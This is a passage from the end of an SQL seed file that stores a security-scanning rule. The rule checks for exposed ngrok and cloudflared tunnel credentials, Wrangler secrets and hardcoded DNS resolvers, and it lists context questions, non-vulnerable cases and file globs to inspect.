- DNSSEC explicitly disabled in configuration
- Secrets passed via miniflare command-line flags

### Context Check
1. Is this a dev-only context (test file, local script, `.dev.` prefix) or production code?
2. Is the ngrok/cloudflared usage in a Dockerfile or deploy script (production risk) vs a local dev script?
3. Are tunnel credentials referenced by path (safe if file not committed) or embedded inline (dangerous)?
4. For wrangler vars — is the value a real secret or a non-sensitive config value like `APP_NAME`?
5. For DNS resolvers — is the IP configurable via env var, or truly hardcoded?
6. Is `.dev.vars` / `.ngrok2/` / `.cloudflared/` / `.wrangler/` in .gitignore?

### NOT Vulnerable
- ngrok in development-only scripts with proper .gitignore for `.ngrok2/`
- `NGROK_AUTHTOKEN` referenced via `process.env` without inline value
- cloudflared tunnel config referencing credentials file path (file itself not committed)
- Wrangler secrets managed via `wrangler secret put` (encrypted server-side)
- `.dev.vars` present but properly .gitignored
- `compatibility_date` within last 12 months
- DNS resolver configurable via environment variable with sensible default
- System default resolver usage (inherits OS configuration)
- DNS-over-HTTPS or DNS-over-TLS configured

### Files to Check
- `**/.ngrok2/**`, `**/.ngrok/**`, `**/ngrok.yml`, `**/ngrok.conf`
- `**/.cloudflared/**`, `**/cloudflared.yml`, `**/cloudflared.yaml`, `**/tunnel.yml`
- `**/wrangler.toml`, `**/wrangler.jsonc`, `**/wrangler.json`
- `**/.dev.vars`, `**/.wrangler/**`
- `**/docker-compose*.{yml,yaml}`, `**/Dockerfile*`
- `**/.github/workflows/*.{yml,yaml}`
- `**/dns*.{ts,js}`, `**/resolver*.{ts,js}`, `**/network*.{ts,js}`
- `**/.resolv.conf`, `**/resolv.conf`
- `**/.env*`
', 'high', NULL, NULL, '**/.ngrok2/**, **/.ngrok/**, **/ngrok.yml, **/ngrok.conf, **/.cloudflared/**, **/cloudflared.yml, **/cloudflared.yaml, **/tunnel.yml, **/wrangler.toml, **/wrangler.jsonc, **/wrangler.json, **/.dev.vars, **/.wrangler/**, **/docker-compose*.{yml,yaml}, **/Dockerfile*, **/.github/workflows/*.{yml,yaml}, **/dns*.{ts,js}, **/resolver*.{ts,js}, **/network*.{ts,js}, **/.resolv.conf, **/resolv.conf, **/.env*', NULL, NULL, NULL, '2026-03-09T20:43:05.674Z', '2026-03-09T20:43:05.674Z');

-- Seeded 40 default rules